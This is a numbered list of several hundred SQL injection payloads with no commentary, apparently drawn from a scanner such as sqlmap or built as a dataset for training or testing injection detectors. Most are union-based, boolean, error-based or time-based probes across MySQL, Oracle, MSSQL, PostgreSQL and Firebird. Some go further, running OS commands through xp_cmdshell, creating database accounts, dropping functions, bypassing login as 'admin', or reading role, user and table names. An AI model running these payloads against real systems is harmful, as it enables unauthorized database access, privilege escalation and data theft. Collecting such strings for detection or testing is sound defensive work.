1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
2 -8203"  )   union all select 6394,6394,6394,6394,6394-- 
6 -7142'   )    )    union all select 5083,5083,5083,5083# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
16 -9031%"  )   order by 1-- 
17 -2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646-- 
24 -2378" where 2686  =  2686 or 6872  =  6872-- 
25 -4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059-- 
26 -8448%" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and "%"  =  " 
27 iif  (  1878  =  2513,1,1/0  )   
34 -4543"  )   or 3038  =  3038 
35 -9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665-- 
37 -9014%'  )   union all select 4211,4211,4211,4211,4211,4211# 
40 -7202%"   )    )    union all select 2901# 
50 -9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa 
55 -9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934# 
65 -8397'   )    )     )   or 2171  =  4788 
66 -9737"   )    )     )   order by 1-- 
67 -1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889-- 
74 -9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719-- 
82 1'+  (  select iutk where 6158  =  6158 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
86 -9891" union all select 7489# 
97 -9356 or elt  (  1032  =  1032,3623  )  -- izgi 
104 -7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff 
106 -1447" union all select 3013,3013,3013,3013,3013,3013,3013-- 
107 -2226%"   )    )    union all select 1018,1018,1018,1018-- 
113 -2071 union all select 4753,4753-- 
119 -5560"   )    )    or 7292  =  6184# 
126 -2168"   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935-- 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
136 -7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891# 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
171  or userid like '% 
178 -3867%'  )   or 3084  =  5633 and   (  '%'  =  ' 
182 -- &password  =  
184 -4152"  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781-- 
192 -4955%' union all select 5928,5928-- 
201 -7624'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'iwab'  =  'iwab 
202 -5591%"   )    )    order by 1-- 
203  (  8266  =  8266  )  *9900 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
214 -1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh 
220 *| 
223 -4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285# 
235 -5327'   )    )     )   or 1606  =  6099 
240 -1050"   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   "orfo" like "orfo 
248 -2276"   )    )    as qwow where 2321  =  2321 or 3534  =  2971-- 
257 -6928"   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   "mxhr" like "mxhr 
262 -5356'  )   or 9323  =  9323# 
275 declare @s varchar  (  22  )   select @s   =  
281 as 
284 -1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  -- 
291 -4205'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   
297 -2453"  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- 
310  end and    (    (     (  "memh" like "memh 
314 -8639  )   or 8138  =  6252 
319 -7416" where 7656  =  7656 order by 1-- 
322 if  (  3392  =  4422  )   select 3392 else drop function xsqq-- 
324 -5520%" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
332 -9393' where 3119  =  3119 or 8571  =  8571-- 
338 -8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049# 
343 -5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ' 
357 -4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup 
361 iif  (  3760  =  4785,1,1/0  )   
362 -1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj 
365 -5386'  )   union all select 8026,8026,8026,8026,8026,8026# 
366 -4165" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772-- 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
385 -6662"   )    )    union all select 6755-- 
388 -4494 or 5291  =  4452 
395 -1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne 
396 -9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900# 
409 iif  (  1157  =  4542,1,1/0  )   
416 -9509'  )   where 9303  =  9303 order by 1# 
423 iif  (  8354  =  3515,1,1/0  )   
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
433 -2448%"  )   or 3038  =  3038 
441 -6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
446 -1621' in boolean mode  )   order by 1-- 
449 -8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap 
453 -4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# 
466 -2569' union all select 4484-- 
473 -8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132-- 
477 -7371'  )   union all select 4531,4531,4531# 
478 -4191  )   order by 1# 
484 -9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  -- 
485 -6546"  )   order by 1# 
486 -4480'  )   where 4661  =  4661 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
495 -3088' or 6872  =  6872 and 'miwk'  =  'miwk 
503 -8633" or 5099  =  5974 
504 -5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
505 -8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
513 -2211" or 2113  =  8885# 
514 1'+  (  select hett where 7228  =  7228 
517 -5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
520 -9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202-- 
524 -8245"   )    )    or 3038  =  3038 
526 -6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675-- 
534 -6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839-- 
536 " " 
543 -1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415# 
555 create user name identified by 'pass123' 
562 -5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466 
563 -2820'   )    )    or 6679  =  8848-- 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
571 -3666"   )    )     )   union all select 4136,4136,4136-- 
573 -9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514 
574 -4775'  )   or 3038  =  3038 
575 if  (  4735  =  8907  )   select 4735 else drop function qigo-- 
586 -5425 where 5933  =  5933 union all select 5933,5933,5933-- 
589 -3250%" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162-- 
592 -4406%' union all select 9599,9599,9599,9599# 
594 -6567'   )    )    union all select 3217# 
599 -6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388# 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
605  (  7098  =  7098 and sleep  (  5   )    )  
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
613 -6184"   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   "rovr"  =  "rovr 
617 -3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420# 
618 -4055'   )    )    as yoez where 3816  =  3816 or   (  8459  =  8459  )  *4906-- 
621 -4045 union all select 6857,6857,6857,6857,6857,6857,6857-- 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
641 -5520"   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- 
643 -9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  ' 
646 if  (  8284  =  6171  )   select 8284 else drop function mbih-- 
649 -7901  )   order by 1-- 
653 -9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616 
663 -2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291# 
667 -4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc 
668 -2658  )   as casi where 7364  =  7364 or 8245  =  9651-- 
677 -4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ' 
687 -5798" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   
690 -3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  -- 
691  union   (  select NULL, NULL,   (  select @@version   )    )    -- 
692 -2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
701 -9841 where 4612  =  4612 union all select 4612-- 
702 -9434"  )   as cqlw where 1600  =  1600 or 2733  =  1047-- 
710 ns 
713 -7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  -- 
720  end and    (    (   "dmgj"  =  "dmgj 
724 -4210"  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
738 28% 
739 -8043%"   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  "%"  =  " 
743 -2817  )   where 1212  =  1212 or 3266  =  1102 
754 -2120'  )   or 8734  =  8844# 
757 -9613"   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  "pupl"  =  "pupl 
758 \x27UNION SELECT 
779 -6527'   )    )    union all select 5053,5053,5053,5053-- 
783 -5575" union all select 8665,8665,8665,8665,8665,8665,8665-- 
789 iif  (  7011  =  2522,1,1/0  )   
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
798 -2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838 
815 -5196"   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  "gbcq" like "gbcq 
822 iif  (  4460  =  1610,1,1/0  )   
826 -1390%"   )    )    union all select 8930,8930,8930,8930,8930# 
831 -6731" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166-- 
836 -4830"   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  "dyut"  =  "dyut 
853  (  case when 8422  =  8452 then 1 else null end  )  
858 iif  (  4638  =  8258,1,1/0  )   
866 -8128"   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375-- 
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
880 -9739' or 8571  =  8571-- 
885 iif  (  5257  =  5257,1,1/0  )   
886 -6155%'   )    )    union all select 2421,2421,2421,2421,2421# 
890 -7395%" order by 1-- 
892 -1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896-- 
895 -8521'+  (  select ucim where 9003  =  9003 union all select 9003-- 
896 -2013"   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
898 -2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  ' 
906 -5640"   )    )    or 9792  =  2728-- 
908 -5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
912 -2568"  )   or   (  8459  =  8459  )  *4906 and   (  "exyw"  =  "exyw 
924 -3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ' 
935  or uname like '% 
944 -9358' or 9887  =  2569-- 
949 -6076"   )    )    or 8277  =  4757 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
971 -5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218-- 
973 -6475"   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  "mdsx" like "mdsx 
974 -7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- 
983 -9864"  )   or elt  (  5885  =  4936,4936  )   and   (  "bfbb" like "bfbb 
984 make_set  (  5679  =  9769,9769  )   
990 1'+  (  select dklj where 3265  =  3265 
996 -7333%"   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  "%"  =  " 
1002 -3107'  )   where 7782  =  7782 or 8571  =  8571-- 
1011 -3321" where 1603  =  1603 union all select 1603,1603,1603,1603# 
1012 if  (  8995  =  9787  )   select 8995 else drop function ofgg-- 
1017 -9037%" union all select 6583# 
1022 elt  (  2567  =  9921,9921  )   
1032 -1235"   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   "ahhz" like "ahhz 
1036 -4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603-- 
1042 -7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
1050 -1203"   )    )    or 8571  =  8571-- 
1051 -9535" order by 1-- 
1064 -4305   )    )     )   union all select 2401,2401-- 
1069 -5147 or   (  8459  =  8459  )  *4906 
1070 -3707"   )    )     )   or 8571  =  8571-- 
1085 -8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ' 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1088 -7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo 
1094 ^' 
1096 -4408"  )   or 6872  =  6872 and   (  "oenu"  =  "oenu 
1098 -8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze 
1100 -6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024# 
1101 -7466 where 5161  =  5161 or 3038  =  3038 
1104 -6218'   )    )    or 2236  =  4469# 
1105 -8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  
1117 -5963" or 9323  =  9323# 
1123 -1602' or 3038  =  3038 
1129 -9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1142 -3672"   )    )    union all select 6093# 
1143 iif  (  1217  =  8831,1,1/0  )   
